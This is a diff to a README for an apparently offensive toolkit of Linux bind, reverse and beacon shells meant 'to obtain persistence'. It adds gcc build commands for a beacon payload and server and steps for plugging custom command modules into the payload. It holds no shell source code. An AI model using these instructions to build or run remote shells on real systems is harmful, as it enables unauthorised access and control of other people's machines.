@@ -7,9 +7,14 @@ These are binaries that you can compile and execute to obtain persistence.
 Note: Currently these shells are Linux specific meaning they most likely won't run on Windows OS. Windows shells will come in the future though!
 
 # Compiling
-To compile the binaries, simply run:
+To compile the bind and reverse shells, simply run:
 ```
 gcc -o server server.c && gcc -o client client.c
+```
+
+To compile the beacon shells:
+```
+gcc -Iinclude -o payload payload.c execute.c && gcc -o server server.c
 ```
 
 # Usage
@@ -38,3 +43,9 @@ rlwrap ./server <PORT>
 
 ./client <IP> <PORT>
 ```
+A feature I implemented with this is that it's easily customizable. You can add your own modules in 3 steps.
+1. Define your function name within include/commands.h 
+2. Add your function to the `execute.c` program
+3. Insert your function name to the dictionary right above the main function in `payload.c`. Follow the format of previous entries.
+
+After that everything should be good to go and ready for use. 
